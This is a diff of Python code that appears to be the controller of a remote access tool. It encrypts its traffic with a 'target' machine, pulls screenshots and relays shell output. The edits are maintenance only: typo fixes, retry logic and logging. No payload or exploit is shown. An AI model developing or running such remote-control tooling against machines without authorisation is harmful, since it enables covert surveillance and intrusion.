@@ -87,27 +87,21 @@ def attempt_exchange(conn_obj):
     while attempts < 3:
         try:
             symmetric_key = start_diffie_hellman_exchange(conn_obj, 2048)
-            return symmetric_key 
+            return symmetric_key
         except Exception as e:
             print(colored(f"[-] Unable to establish cryptographic keys, re-attempting . . . ({attempts+1}/3)", "red"))
             log_activity(f"Unable to establish cryptographic keys due to {e}, attempt ({attempts+1}/3)", "error")
             attempts += 1
             time.sleep(2)  # Wait for 2 seconds before retrying
-            if attempts == 3:
-                conn_obj.close()
-                conn_obj = connect_target(port)
-                attempts = 0
 
     print(colored("\n[-] Failed to establish a secure connection after several attempts. Try reconnecting with target!", "red"))
+    log_activity("Failed to establish a secure connection after 3 attempts.", "error")
     return None  # Return None if all attempts fail  
 
 def encrypt_message(plaintext):
     global symmetric_key
     if isinstance(plaintext, str):
-        try:
-            plaintext = plaintext.encode()
-        except BytesWarning:
-            plaintext = plaintext.encode('utf-8')
+        plaintext = plaintext.encode('utf-8')
     else:
         plaintext = pickle.dumps(plaintext)
 
@@ -282,10 +276,10 @@ def screenshot_command(client_output, conn_obj):
             data_size = int(client_output.decode().strip())
             received_data = reliable_recieve(conn_obj, data_size)
 
-            # Decyrpt data
+            # Decrypt data
             decrypted_data = process_and_check_recieved_data(received_data, data_size)
-            if "Failed" in decrypted_data:
-                print(f"[!] An error has occured! {decrypted_data}")
+            if isinstance(decrypted_data, str):
+                print(f"[!] An error has occurred! {decrypted_data}")
                 break
 
             # Check if the decrypted data starts with PNG signature
@@ -347,7 +341,7 @@ def handle_reconnections(port, conn_obj):
 
         return conn_obj, symmetric_key
     else:
-        log_activity("Program ended because the user did not want to reconnect with the target agaib.", "info")
+        log_activity("Program ended because the user did not want to reconnect with the target again.", "info")
         exit("Program ended")
 
 def connect_target(port):
@@ -528,7 +522,7 @@ def shell_command(client_output, conn_obj):
             except:
                 retry_counter += 1
                 continue
-        if retry_counter == 3:
+        if retry_counter >= 3:
             print("[-] Unable to parse and decrypt output from target after several attempts, skipping")
         else:
             print(output)
